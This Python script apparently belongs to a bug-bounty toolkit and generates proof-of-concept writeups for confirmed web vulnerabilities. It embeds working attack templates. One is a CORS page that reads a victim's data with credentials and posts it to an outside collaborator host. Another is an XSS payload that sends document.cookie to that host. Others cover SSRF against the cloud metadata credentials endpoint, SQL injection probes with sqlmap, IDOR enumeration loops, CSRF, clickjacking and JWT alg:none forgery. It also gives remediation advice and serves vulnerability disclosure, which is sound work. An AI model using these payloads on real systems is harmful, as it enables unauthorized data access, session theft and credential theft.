#!/usr/bin/env python3
"""
poc-synth — turn a CONFIRMED finding into a runnable PoC + a report-ready writeup.

A finding without a working PoC is a claim. This scaffolds the real artifact per bug class:
the curl reproduction, the attacker HTML page (CORS/CSRF/clickjacking), the enumeration script
(IDOR at scale), the injection commands (SQLi/SSRF), or the race fire — plus numbered repro steps,
an impact statement, and class-specific remediation. Fill the <placeholders>, run it, attach output.

Run it only AFTER adversarial-verify.py says CONFIRMED — this proves impact, it doesn't find bugs.

Usage:
  poc-synth.py --class idor --url 'https://api.acme.com/api/v1/orders/1337' --method GET \
     --id-param id --victim-id 1337 --auth-b 'Authorization: Bearer <B-token>' \
     --title 'IDOR on /orders/{id}' [--out ./.hunt/poc]
  poc-synth.py --class cors --url 'https://api.acme.com/api/me' --origin https://evil.tld
Exit: 0 ok (writes ./.hunt/poc/<slug>.md + prints it).
"""
import sys, os, re
from pathlib import Path

HUNT = Path(os.environ.get("HUNT_DIR", "./.hunt"))


def arg(n, d=""):
    return sys.argv[sys.argv.index(n) + 1] if n in sys.argv else d


def norm(c):
    return (c or "").lower().strip().replace(" ", "").replace("-", "").replace("_", "")


REMEDIATION = {
    "idor": "Enforce server-side object-level authorization: verify the authenticated principal owns "
            "(or may access) the requested object before returning it. Don't rely on unguessable ids.",
    "authz": "Enforce function/role checks server-side on every endpoint, including global/non-id-scoped "
             "settings. Default-deny; never rely on the client hiding the control.",
    "bfla": "Apply role-based authorization on privileged functions server-side; default-deny.",
    "cors": "Do not reflect arbitrary Origin with Access-Control-Allow-Credentials:true. Use a strict "
            "server-side allowlist; never allow Origin:null for credentialed requests.",
    "csrf": "Require an unpredictable, per-session CSRF token on state-changing requests and/or SameSite=Strict cookies.",
    "ssrf": "Validate/allowlist outbound URLs, resolve+pin DNS, block link-local/internal ranges, drop redirects to internal hosts.",
    "sqli": "Use parameterized queries / prepared statements. Never concatenate user input into SQL.",
    "xss": "Context-aware output encoding; a strict CSP; avoid sinks like innerHTML/dangerouslySetInnerHTML.",
    "race": "Make the operation atomic/idempotent: DB constraints, row locks, or an idempotency key enforced server-side.",
    "openredirect": "Allowlist redirect targets server-side; reject absolute/external URLs and javascript:/data: schemes.",
    "jwt": "Pin the algorithm, verify the signature with the correct key, reject alg:none, validate iss/aud/exp.",
    "session": "Revoke all active tokens/sessions on disable, logout, and password change.",
    "clickjacking": "Set X-Frame-Options: DENY or CSP frame-ancestors 'none' on sensitive pages.",
    "logic": "Enforce the intended business rule server-side (state machine / invariant), not in the client.",
}


def auth_lines():
    out = []
    for a, lbl in [("--auth", "attacker"), ("--auth-a", "identity A"), ("--auth-b", "identity B (low-priv/other user)")]:
        v = arg(a)
        if v:
            out.append((lbl, v))
    return out


def hdr(auth):
    return f" \\\n  -H '{auth}'" if auth else ""


def curl(url, method="GET", auth="", data=""):
    m = f"-X {method} " if method and method != "GET" else ""
    d = f" \\\n  -H 'Content-Type: application/json' -d '{data}'" if data else ""
    return f"curl -sk {m}'{url}'{hdr(auth)}{d} -i"


def build(cls, url):
    method = arg("--method", "GET")
    a = auth_lines()
    b = arg("--auth-b") or (a[-1][1] if a else "")
    origin = arg("--origin", "https://evil.tld")
    data = arg("--data", "")
    parts = []

    if cls == "idor":
        idp = arg("--id-param", "id")
        vid = arg("--victim-id", "<VICTIM_ID>")
        parts.append(("Reproduce (identity B requests A's object)", "```bash\n" + curl(url, method, b, data) + "\n```"))
        base = re.sub(r"(\d+)(?!.*\d)", "$i", url)
        parts.append(("Enumerate at scale (impact = bulk access)",
                      "```bash\nfor i in $(seq 1000 1100); do\n"
                      f"  code=$(curl -sk -o /tmp/r_$i.json -w '%{{http_code}}' '{base}'"
                      + (f" -H '{b}'" if b else "") + ")\n"
                      "  [ \"$code\" = 200 ] && echo \"$i OK $(wc -c </tmp/r_$i.json)b\"\ndone\n```"))
    elif cls == "cors":
        parts.append(("Attacker page (host, open as a victim with an active session)",
                      f"```html\n<!-- poc.html on {origin} -->\n<script>\n"
                      f"fetch('{url}', {{credentials:'include'}})\n"
                      "  .then(r => r.text())\n"
                      "  .then(d => fetch('https://COLLAB.oastify.com/leak', {method:'POST', body:d}));\n"
                      "</script>\n```"))
        parts.append(("Confirm the server reflects Origin + credentials",
                      "```bash\n" + curl(url, "GET", "") .replace(" -i", f" -H 'Origin: {origin}' -i")
                      + "\n# look for: Access-Control-Allow-Origin: " + origin + "  AND  Access-Control-Allow-Credentials: true\n```"))
    elif cls == "csrf":
        parts.append(("Auto-submitting attacker page",
                      f"```html\n<form action='{url}' method='{method or 'POST'}'>\n"
                      f"  <input name='<field>' value='<attacker-value>'>\n</form>\n"
                      "<script>document.forms[0].submit()</script>\n```"))
    elif cls == "clickjacking":
        parts.append(("Framing PoC (page lacks X-Frame-Options / frame-ancestors)",
                      f"```html\n<style>iframe{{opacity:.2;position:absolute;top:0;left:0;width:100%;height:800px}}</style>\n"
                      f"<iframe src='{url}'></iframe>\n```"))
        parts.append(("Confirm missing header", "```bash\n" + curl(url) + " | grep -i 'x-frame-options\\|frame-ancestors' || echo 'NO framing protection'\n```"))
    elif cls == "xss":
        payload = arg("--payload", "\"><img src=x onerror=fetch('https://COLLAB.oastify.com/'+document.cookie)>")
        parts.append(("Payload", f"```\n{payload}\n```\nContext: <attribute|HTML|JS> — confirm it EXECUTES (not encoded)."))
        parts.append(("Reproduce", "```bash\n" + curl(url + (("&" if "?" in url else "?") + arg("--param", "q") + "=" + "PAYLOAD")) + "\n```"))
    elif cls == "ssrf":
        internal = arg("--internal", "http://169.254.169.254/latest/meta-data/iam/security-credentials/")
        p = arg("--param", "url")
        parts.append(("Point the fetch at internal / metadata",
                      "```bash\n" + curl(re.sub(r"([?&]" + re.escape(p) + r"=)[^&]*", r"\1" + internal, url) if p in url else url + f"?{p}={internal}", method, arg('--auth')) + "\n```"))
        parts.append(("Confirm out-of-band (blind)", "Use a Collaborator/OAST host as the target; a DNS/HTTP hit proves server-side fetch."))
    elif cls == "sqli":
        p = arg("--param", "q")
        parts.append(("Boolean differential (true vs false)",
                      "```bash\n" + curl(url + (("&" if "?" in url else "?") + p + "=1' AND '1'='1") , method, arg('--auth')) + "\n"
                      + curl(url + (("&" if "?" in url else "?") + p + "=1' AND '1'='2"), method, arg('--auth')) + "\n# different responses ⇒ injectable\n```"))
        parts.append(("Automate (authorized)", f"```bash\nsqlmap -u '{url}' -p {p} --batch --risk 2 --level 3\n```"))
    elif cls == "race":
        parts.append(("Fire N in parallel (double-effect)",
                      "```bash\n# prefer the harness (barrier-synced):\nrace-fire.py --url '" + url + "'"
                      + (f" --header '{b}'" if b else "") + " --count 20 --expect-one --approve\n```"))
        parts.append(("Verify STATE delta", "Confirm two real effects (balance/redeems), not just two HTTP 200s."))
    elif cls == "openredirect":
        p = arg("--param", "next")
        parts.append(("Crafted URL", "```\n" + (url if p in url else url + f"?{p}=https://evil.tld") + "\n```\nConfirm a 30x Location: to the attacker domain."))
    elif cls == "jwt":
        parts.append(("Forge (alg:none / weak key)", "```bash\n# alg:none — strip signature, set header {\"alg\":\"none\"}; or crack HS256 with a wordlist\n# then replay against a protected endpoint:\n" + curl(url, method, "Authorization: Bearer <forged>") + "\n```"))
    elif cls == "session":
        parts.append(("Old token still valid after disable/pw-change",
                      "```bash\n# 1) capture token; 2) disable/reset the account (admin) ; 3) reuse:\n"
                      + curl(url, method, arg("--auth") or "Authorization: Bearer <OLD_TOKEN>") + "\n# expect 401; a 200 proves non-revocation\n```"))
    else:
        parts.append(("Reproduce", "```bash\n" + curl(url, method, arg("--auth"), data) + "\n```"))

    return parts


def main():
    cls = norm(arg("--class"))
    url = arg("--url")
    if not cls or not url:
        sys.exit("usage: poc-synth.py --class <c> --url <full-url> [--method] [--auth/-a/-b] [--param] [--id-param] "
                 "[--victim-id] [--origin] [--payload] [--internal] [--title] [--out DIR]")
    title = arg("--title") or f"{cls.upper()} on {url}"
    parts = build(cls, url)
    a = auth_lines()

    md = [f"# PoC — {title}", "", f"**Class:** {cls}  **URL:** `{url}`  **Method:** {arg('--method','GET')}", ""]
    if a:
        md += ["**Identities used:**"] + [f"- {lbl}: `{v[:24]}…`" for lbl, v in a] + [""]
    md += ["## Proof of concept"]
    steps = []
    for i, (h, body) in enumerate(parts, 1):
        md += [f"### {i}. {h}", body, ""]
        steps.append(h)
    md += ["## Reproduction steps"]
    md += [f"{i}. {s}" for i, s in enumerate(steps, 1)]
    md += ["", "## Impact",
           arg("--impact") or "<state concrete impact: who is affected, what data/actions, at what scale. "
           "Tie to the escalators proven by adversarial-verify.py.>", ""]
    md += ["## Remediation", REMEDIATION.get(cls, "Enforce the missing server-side control; default-deny."), ""]
    md += ["## Evidence", f"- captured request/response: `{arg('--evidence','./.hunt/evidence/<F>')}`",
           "- reproduced ≥2×; control (negative) test attached", ""]
    text = "\n".join(md)

    out = Path(arg("--out") or (HUNT / "poc"))
    out.mkdir(parents=True, exist_ok=True)
    slug = re.sub(r"[^a-z0-9]+", "-", (cls + "-" + re.sub(r"^https?://", "", url)).lower()).strip("-")[:60]
    fp = out / (slug + ".md")
    fp.write_text(text)
    print(text)
    print(f"\n[poc] written → {fp}  (fill <placeholders>, run, attach output; then dedup-check.py → report)")


if __name__ == "__main__":
    main()
